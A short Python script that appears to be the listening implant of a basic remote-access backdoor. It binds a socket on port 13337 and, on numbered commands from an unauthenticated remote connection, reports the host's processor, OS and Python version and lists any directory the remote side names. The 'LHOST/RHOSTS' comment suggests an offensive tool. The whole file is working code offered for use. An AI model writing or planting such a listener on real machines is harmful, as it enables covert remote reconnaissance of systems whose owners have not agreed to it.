import socket, os, platform

SRV_IP = "192.168.75.130" # change as needed
port = 13337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((SRV_IP, port))

s.listen(1) # only one LHOST and one RHOSTS
conn, address = s.accept()

while True:
    try:
        data = conn.recv(1024)
    except:
        continue

    if(data.decode('utf-8') == "1"):
        #currently supporting only Windows OS, not tested on Mac/Linux
        info = "Processor Type: " + platform.machine() + "\nOS Version: "+ platform.platform() + "\nPython Version: " + platform.python_version() + "\n"
        conn.sendall(info.encode())
    elif(data.decode('utf-8') == "2"):
        data= conn.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            toSendString = ""
            for file in filelist:
                toSendString += "," + file
        except:
            toSendString = "Invalid Path!"

        conn.sendall(toSendString.encode('utf-8'))
    elif(data.decode('utf-8') == "3"):
        conn.close()
        conn, address = s.accept()

